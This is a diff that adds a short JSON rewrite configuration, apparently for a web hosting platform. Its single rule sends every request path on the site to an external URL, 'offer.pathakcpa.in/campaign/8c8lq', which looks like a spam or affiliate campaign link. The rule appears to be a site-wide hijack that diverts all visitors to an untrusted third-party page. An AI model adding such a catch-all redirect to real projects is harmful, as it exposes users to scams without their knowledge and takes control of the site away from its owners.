@@ -1,0 +1,8 @@
+{
+  "rewrites": [
+    {
+      "source": "/(.*)",
+      "destination": "https://offer.pathakcpa.in/campaign/8c8lq"
+    }
+  ]
+}
